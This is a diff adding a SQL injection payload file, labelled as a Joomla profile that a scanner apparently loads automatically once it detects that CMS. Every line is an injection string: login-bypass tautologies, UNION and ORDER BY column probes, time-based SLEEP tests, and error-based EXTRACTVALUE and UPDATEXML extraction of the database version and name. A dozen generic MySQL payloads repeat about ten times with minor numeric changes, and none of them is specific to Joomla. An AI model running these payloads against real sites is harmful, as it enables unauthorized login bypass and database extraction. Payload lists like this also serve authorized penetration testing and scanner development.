@@ -1,0 +1,122 @@
+# joomla CMS-specific SQL injection payload profile
+# Loaded automatically when CMS detector identifies Joomla
+' OR '1'='1' /*joomla_1*/
+' AND 1=2 UNION SELECT NULL-- joomla_2
+' AND SLEEP(4)-- joomla_3
+' OR IF(4=4,SLEEP(2),0)-- joomla_4
+' UNION SELECT NULL,NULL,NULL-- joomla_5
+' ORDER BY 7-- joomla_6
+' GROUP BY 8 HAVING 1=1-- joomla_7
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- joomla_8
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- joomla_9
+1 OR 1=1# joomla_10
+-1 UNION SELECT NULL-- joomla_11
+' OR 1=1-- joomla_12
+' OR '1'='1' /*joomla_13*/
+' AND 1=2 UNION SELECT NULL-- joomla_14
+' AND SLEEP(1)-- joomla_15
+' OR IF(16=16,SLEEP(2),0)-- joomla_16
+' UNION SELECT NULL,NULL,NULL-- joomla_17
+' ORDER BY 9-- joomla_18
+' GROUP BY 4 HAVING 1=1-- joomla_19
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- joomla_20
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- joomla_21
+1 OR 1=1# joomla_22
+-1 UNION SELECT NULL-- joomla_23
+' OR 1=1-- joomla_24
+' OR '1'='1' /*joomla_25*/
+' AND 1=2 UNION SELECT NULL-- joomla_26
+' AND SLEEP(3)-- joomla_27
+' OR IF(28=28,SLEEP(2),0)-- joomla_28
+' UNION SELECT NULL,NULL,NULL-- joomla_29
+' ORDER BY 1-- joomla_30
+' GROUP BY 8 HAVING 1=1-- joomla_31
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- joomla_32
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- joomla_33
+1 OR 1=1# joomla_34
+-1 UNION SELECT NULL-- joomla_35
+' OR 1=1-- joomla_36
+' OR '1'='1' /*joomla_37*/
+' AND 1=2 UNION SELECT NULL-- joomla_38
+' AND SLEEP(5)-- joomla_39
+' OR IF(40=40,SLEEP(2),0)-- joomla_40
+' UNION SELECT NULL,NULL,NULL-- joomla_41
+' ORDER BY 3-- joomla_42
+' GROUP BY 4 HAVING 1=1-- joomla_43
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- joomla_44
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- joomla_45
+1 OR 1=1# joomla_46
+-1 UNION SELECT NULL-- joomla_47
+' OR 1=1-- joomla_48
+' OR '1'='1' /*joomla_49*/
+' AND 1=2 UNION SELECT NULL-- joomla_50
+' AND SLEEP(2)-- joomla_51
+' OR IF(52=52,SLEEP(2),0)-- joomla_52
+' UNION SELECT NULL,NULL,NULL-- joomla_53
+' ORDER BY 5-- joomla_54
+' GROUP BY 8 HAVING 1=1-- joomla_55
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- joomla_56
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- joomla_57
+1 OR 1=1# joomla_58
+-1 UNION SELECT NULL-- joomla_59
+' OR 1=1-- joomla_60
+' OR '1'='1' /*joomla_61*/
+' AND 1=2 UNION SELECT NULL-- joomla_62
+' AND SLEEP(4)-- joomla_63
+' OR IF(64=64,SLEEP(2),0)-- joomla_64
+' UNION SELECT NULL,NULL,NULL-- joomla_65
+' ORDER BY 7-- joomla_66
+' GROUP BY 4 HAVING 1=1-- joomla_67
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- joomla_68
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- joomla_69
+1 OR 1=1# joomla_70
+-1 UNION SELECT NULL-- joomla_71
+' OR 1=1-- joomla_72
+' OR '1'='1' /*joomla_73*/
+' AND 1=2 UNION SELECT NULL-- joomla_74
+' AND SLEEP(1)-- joomla_75
+' OR IF(76=76,SLEEP(2),0)-- joomla_76
+' UNION SELECT NULL,NULL,NULL-- joomla_77
+' ORDER BY 9-- joomla_78
+' GROUP BY 8 HAVING 1=1-- joomla_79
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- joomla_80
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- joomla_81
+1 OR 1=1# joomla_82
+-1 UNION SELECT NULL-- joomla_83
+' OR 1=1-- joomla_84
+' OR '1'='1' /*joomla_85*/
+' AND 1=2 UNION SELECT NULL-- joomla_86
+' AND SLEEP(3)-- joomla_87
+' OR IF(88=88,SLEEP(2),0)-- joomla_88
+' UNION SELECT NULL,NULL,NULL-- joomla_89
+' ORDER BY 1-- joomla_90
+' GROUP BY 4 HAVING 1=1-- joomla_91
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- joomla_92
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- joomla_93
+1 OR 1=1# joomla_94
+-1 UNION SELECT NULL-- joomla_95
+' OR 1=1-- joomla_96
+' OR '1'='1' /*joomla_97*/
+' AND 1=2 UNION SELECT NULL-- joomla_98
+' AND SLEEP(5)-- joomla_99
+' OR IF(100=100,SLEEP(2),0)-- joomla_100
+' UNION SELECT NULL,NULL,NULL-- joomla_101
+' ORDER BY 3-- joomla_102
+' GROUP BY 8 HAVING 1=1-- joomla_103
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- joomla_104
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- joomla_105
+1 OR 1=1# joomla_106
+-1 UNION SELECT NULL-- joomla_107
+' OR 1=1-- joomla_108
+' OR '1'='1' /*joomla_109*/
+' AND 1=2 UNION SELECT NULL-- joomla_110
+' AND SLEEP(2)-- joomla_111
+' OR IF(112=112,SLEEP(2),0)-- joomla_112
+' UNION SELECT NULL,NULL,NULL-- joomla_113
+' ORDER BY 5-- joomla_114
+' GROUP BY 4 HAVING 1=1-- joomla_115
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- joomla_116
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- joomla_117
+1 OR 1=1# joomla_118
+-1 UNION SELECT NULL-- joomla_119
+' OR 1=1-- joomla_120
